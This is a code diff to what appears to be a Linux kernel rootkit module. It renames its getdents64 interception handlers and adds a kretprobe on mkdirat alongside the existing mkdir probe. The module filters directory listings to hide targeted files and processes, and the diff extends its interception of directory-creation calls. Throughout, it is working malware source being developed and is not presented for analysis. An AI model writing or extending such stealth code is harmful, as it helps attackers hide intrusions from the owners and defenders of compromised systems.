@@ -81,7 +81,7 @@ static bool rk_target_match(struct rk_target_list *list, const char *name)
 
 /* ── getdents64 interception ─────────────────────────────────── */
 
-struct getdents_data {
+struct rk_getdents_data {
 	void __user *ubuf;
 };
 
@@ -94,13 +94,13 @@ static bool should_hide_dirent(const char *name)
 	return false;
 }
 
-static int getdents_entry(struct kretprobe_instance *ri,
+static int rk_getdents_entry(struct kretprobe_instance *ri,
 			   struct pt_regs *regs)
 {
-	struct getdents_data *data;
+	struct rk_getdents_data *data;
 	struct pt_regs *uregs;
 
-	data = (struct getdents_data *)ri->data;
+	data = (struct rk_getdents_data *)ri->data;
 
 	/* __x64_sys_getdents64 wraps its args in nested pt_regs */
 	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
@@ -111,15 +111,15 @@ static int getdents_entry(struct kretprobe_instance *ri,
 	return 0;
 }
 
-static int getdents_return(struct kretprobe_instance *ri,
+static int rk_getdents_return(struct kretprobe_instance *ri,
 			    struct pt_regs *regs)
 {
-	struct getdents_data *data;
+	struct rk_getdents_data *data;
 	struct linux_dirent64 *d;
 	long total, new_total, off;
 	char *kbuf;
 
-	data = (struct getdents_data *)ri->data;
+	data = (struct rk_getdents_data *)ri->data;
 	total = regs_return_value(regs);
 	if (total <= 0)
 		return 0;
@@ -160,10 +160,10 @@ static int getdents_return(struct kretprobe_instance *ri,
 	return 0;
 }
 
-static struct kretprobe getdents_probe = {
-	.handler        = getdents_return,
-	.entry_handler  = getdents_entry,
-	.data_size      = sizeof(struct getdents_data),
+static struct kretprobe rk_getdents_probe = {
+	.handler        = rk_getdents_return,
+	.entry_handler  = rk_getdents_entry,
+	.data_size      = sizeof(struct rk_getdents_data),
 	.maxactive      = 20,
 	.kp.symbol_name = "__x64_sys_getdents64",
 };
@@ -197,12 +197,10 @@ struct rk_mkdir_data {
 	bool intercepted;
 };
 
-static int rk_mkdir_entry(struct kretprobe_instance *inst,
-			   struct pt_regs *regs)
+static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
+			     const char __user *pathname)
 {
 	struct rk_mkdir_data *data;
-	struct pt_regs *uregs;
-	const char __user *pathname;
 	char buf[RK_PATH_MAX];
 	const char *base;
 	long copied;
@@ -210,11 +208,6 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	data = (struct rk_mkdir_data *)inst->data;
 	data->intercepted = false;
 
-	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
-	if (!uregs)
-		return 0;
-
-	pathname = (const char __user *)uregs->di;
 	copied = strncpy_from_user(buf, pathname, sizeof(buf));
 	if (copied <= 0)
 		return 0;
@@ -232,6 +225,28 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	return 0;
 }
 
+static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
+				struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
+}
+
+static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
+				  struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
+}
+
 static int rk_mkdir_return(struct kretprobe_instance *inst,
 			    struct pt_regs *regs)
 {
@@ -245,7 +260,15 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 
 static struct kretprobe rk_mkdir_probe = {
 	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry,
+	.entry_handler  = rk_mkdir_entry_mkdir,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
+};
+
+static struct kretprobe rk_mkdirat_probe = {
+	.kp.symbol_name = "__x64_sys_mkdirat",
+	.entry_handler  = rk_mkdir_entry_mkdirat,
 	.handler        = rk_mkdir_return,
 	.data_size      = sizeof(struct rk_mkdir_data),
 	.maxactive      = 8,
@@ -260,7 +283,7 @@ static int __init rk_init(void)
 	spin_lock_init(&file_targets.lock);
 	spin_lock_init(&pid_targets.lock);
 
-	ret = register_kretprobe(&getdents_probe);
+	ret = register_kretprobe(&rk_getdents_probe);
 	if (ret)
 		return ret;
 
@@ -268,17 +291,24 @@ static int __init rk_init(void)
 	if (ret)
 		goto fail_mkdir;
 
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret)
+		goto fail_mkdirat;
+
 	return 0;
 
+fail_mkdirat:
+	unregister_kretprobe(&rk_mkdir_probe);
 fail_mkdir:
-	unregister_kretprobe(&getdents_probe);
+	unregister_kretprobe(&rk_getdents_probe);
 	return ret;
 }
 
 static void __exit rk_exit(void)
 {
+	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
-	unregister_kretprobe(&getdents_probe);
+	unregister_kretprobe(&rk_getdents_probe);
 }
 
 module_init(rk_init);
